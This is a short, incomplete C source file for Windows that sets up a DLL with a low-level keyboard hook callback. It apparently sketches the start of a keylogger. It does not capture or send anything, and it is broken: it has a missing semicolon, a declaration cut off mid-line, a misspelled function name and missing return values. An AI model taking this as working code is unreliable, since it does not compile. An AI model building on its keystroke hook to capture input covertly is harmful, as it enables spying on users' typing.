#include "data_tools.h"
#include <stdbool.h>
#include <windows.h>

// global hook handle
static HHOOK g_keyboardHook = NULL;

bool GetKeyName(DWORD vkCode) {
    if ('A' <= vkCode && vkCode <= 'Z') return true;

}

// keyboard callback Proc
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (NullSystemQueue()) {
        StartSystemQueue()
    }
    int syscode = getSystemMSG();
    if (syscode == START_SYS) appendSystemMSG(DURING_SYS);
    else if (syscode == DURING_SYS && nCode >= 0) {
        KBDLLHOOKSTRUCT *
    }
}

// start dll
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (NUllSystemQueue()) {
        StartSystemQueue();
    }

}